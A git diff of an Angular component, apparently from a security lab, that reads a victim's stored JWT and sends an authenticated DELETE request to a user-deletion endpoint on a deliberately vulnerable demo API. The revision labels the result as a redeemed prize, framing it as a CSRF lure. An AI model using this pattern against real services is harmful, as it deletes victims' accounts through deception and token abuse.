@@ -10,25 +10,20 @@ export class AttackComponent {
   constructor(private http: HttpClient) {}
 
   attack() {
-    const token = localStorage.getItem("auth-token");
-    
-    fetch('https://java-vuln-api.onrender.com/auth/deluser/d6591f66-a608-4dce-a4f6-a09c392a1ed3', {
-      method: 'DELETE',
-      headers: {
-        'Authorization': `Bearer ${token}`,
-        'Content-Type': 'application/json'
-      }
-    })
-    .then(response => {
-      if (response.ok) {
-        alert('Ataque bem sucedido!');
-      } else {
-        throw new Error(`Falha na requisição: ${response.status}`);
-      }
-    })
-    .catch(error => {
-      console.error('Erro:', error);
-      alert('Falha no ataque: ' + error.message);
-    });
-  }
+    const token = localStorage.getItem("auth-token");  // Busca o token JWT no localStorage
+  
+    if (token) {
+      const headers = new HttpHeaders().set('Authorization', `Bearer ${token}`);
+  
+      this.http.delete('https://java-vuln-api.onrender.com/auth/deluser/d6591f66-a608-4dce-a4f6-a09c392a1ed3', {
+        headers,
+        withCredentials: true  // Garante o envio de cookies, se necessário
+      }).subscribe({
+        next: () => alert('Prêmio resgatado com sucesso!'),
+        error: (err) => console.error('Erro no ataque CSRF:', err)
+      });
+    } else {
+      console.error('Token JWT não encontrado no localStorage.');
+    }
+  }  
 }
